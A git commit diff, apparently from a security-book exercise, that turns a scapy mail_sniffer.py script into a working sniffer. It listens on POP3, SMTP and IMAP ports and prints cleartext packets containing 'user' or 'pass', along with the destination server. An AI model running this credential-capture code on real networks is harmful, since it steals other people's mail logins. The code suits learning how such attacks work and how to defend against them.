e28d02715428bb46066a6749406dad09522b4ade
wsrtka <witold.serwatka@pm.me>
2020-06-28 17:32:20 +0200

    added option to find username and password from email TCP protocols

--- Chapter3/mail_sniffer.py
+++ Chapter3/mail_sniffer.py
@@ -2,7 +2,15 @@ from scapy.all import *
 
 
 def packet_callback(packet):
-    print(packet.show())
+    
+    if packet[TCP].payload:
+
+        mail_packet = str(packet[TCP].payload)
+
+        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
+
+            print('[*] Server: %s' % packet[IP].dst)
+            print('[*] %s' % packet[TCP].payload)
 
 
-sniff(prn=packet_callback, count=1)
+sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
